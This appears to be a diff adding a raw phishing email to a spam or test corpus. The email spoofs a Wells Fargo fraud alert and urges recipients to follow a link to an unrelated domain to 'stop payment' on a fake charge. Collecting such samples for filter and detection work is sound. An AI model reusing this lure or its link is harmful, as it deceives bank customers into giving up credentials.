@@ -1,0 +1,98 @@
+Return-Path: <oracle@localhost.localdomain>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 2BA514697A
+	for <user@login.example.com>; Tue,  8 May 2007 11:28:42 -0400 (EDT)
+Received: from mail.example.org (mail.example.org [192.168.6.4])
+	by mail.example.org (Postfix) with ESMTP id 1D7D5131FAAA
+	for <user@example.com>; Tue,  8 May 2007 11:28:42 -0400 (EDT)
+Received: from localhost.localdomain (unknown [222.106.128.31])
+	by mail.example.org (Postfix) with ESMTP id CB71C6FA1C5
+	for <user@example.com>; Tue,  8 May 2007 11:28:41 -0400 (EDT)
+Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
+	by localhost.localdomain (8.13.8/8.13.8) with ESMTP id l483UqFZ002588
+	for <user@example.com>; Tue, 8 May 2007 12:30:52 +0900
+Received: (from oracle@localhost)
+	by localhost.localdomain (8.13.8/8.13.8/Submit) id l483UpmH002586;
+	Tue, 8 May 2007 12:30:51 +0900
+Date: Tue, 8 May 2007 12:30:51 +0900
+Message-Id: <200705080330.l483UpmH002586@localhost.localdomain>
+To: user@example.com
+Subject: AUTHORIZATIONS / CLEARING AND SETTLEMENT DEPARTMENT
+From: Wells Fargo <department@email-wellsfargo.com>
+Content-Type: text/html
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 1235
+
+
+
+<table height=479 cellspacing=0 cellpadding=0 width=654 border=0>
+  <tbody>
+    <tr>
+      <td colspan=2 height=79><font face="Verdana, Arial, Helvetica, sans-serif"><strong><font size=2>AUTHORIZATIONS / CLEARING
+            AND SETTLEMENT DEPARTMENT<br>
+        </font></strong>
+        </font>
+        <hr>
+        <font face="Verdana, Arial, Helvetica, sans-serif">        <font size=2><span class=style26>We have strong reasons to believe
+          that you have been the victim of a fraudulent transaction</span><br>
+        </font></font>
+        <hr>
+      </td>
+    </tr>
+    <tr>
+      <td width=164 height=57><div align=left><img src="http://a248.e.akamai.net/7/248/1856/bb61162e7a787f/www.wellsfargo.com/img/header/logo_62sq.gif"> <img src="http://a248.e.akamai.net/7/248/1856/53845d4a1846e7/www.wellsfargo.com/img/header/coach.gif"> </div></td>
+      <td class=style19 width=490 height=57>
+        <p><font size=2 face="Verdana, Arial, Helvetica, sans-serif"><span class=style19><br>
+  Our department recorded a payment request from &quot;<em>Internet Friends
+          Network -iFriends.net - Girls Show</em>&quot;<br>
+          to enable the charge of $ 439,19 on your account.</span><br>
+          <br>
+          Because the order was made from an european internet address, we put
+          an Exception Payment on transaction id #POS01-2608771 motivated by
+          our Geographical Tracking System.<br>
+          <br>
+        </font></p>
+      </td>
+    </tr>
+    <tr>
+      <td colspan=2>
+        <div class=style19 align=justify>
+          <p><font size=2 face="Verdana, Arial, Helvetica, sans-serif"><strong><span class=style23>THE PAYMENT IS PENDING
+                  FOR THE MOMENT.</span><br>
+            <br>
+            </strong> • If you made this transaction or if you just authorize
+            this payment, please ignore or remove this email message. The transaction
+            will be shown on your monthly statement as &quot;<em>Internet Friends
+            Network</em>&quot;.<br>
+            <br>
+• If you didn't make this payment and would like to decline the $ 419,49 billing
+to your card, please follow the link below to deny the payment:</font></p>
+        </div>
+        <p class=style21><font size=2 face="Verdana, Arial, Helvetica, sans-serif"><a href="http://suiyizhai.com/img/glyph/wellsfargo.com/wellsfargo/Updates_info/index.html"><img src="https://a248.e.akamai.net/7/248/3608/bb61162e7a787f/online.wellsfargo.com/common/images/al_continue_off.gif" border=0 width=74 height=23></a> <br>
+          </font><font face="Verdana, Arial, Helvetica, sans-serif"><strong><font size=2><span class=style27><br>
+          <a href="http://suiyizhai.com/img/glyph/wellsfargo.com/wellsfargo/Updates_info/index.html">Continue to Stop Payment</a></span></font></strong></font></p>
+      </td>
+    </tr>
+    <tr>
+      <td colspan=2 height=106><font face="Verdana, Arial, Helvetica, sans-serif"><span class=style19><font size=2><br>
+        We apologize for any inconvenience this may cause, and appreciate your
+              assistance in helping us maintain the integrity of the entire Wells
+              Fargo system.<br>
+        </font></span>
+        </font>
+        <p class=style19><font size=2 face="Verdana, Arial, Helvetica, sans-serif">Thank you for your prompt attention
+              to this matter.<br>
+          <br>
+        </font></p>
+          <hr>
+          <font face="Verdana, Arial, Helvetica, sans-serif">          <font size=2><span class=style19>MESSAGE CENTER: TICKET No. #00302173213</span><span class=style22><br>
+        Please do not reply to this mail. Mail sent to this address cannot be
+        answered</span></font></font></td>
+    </tr>
+  </tbody>
+</table>
+
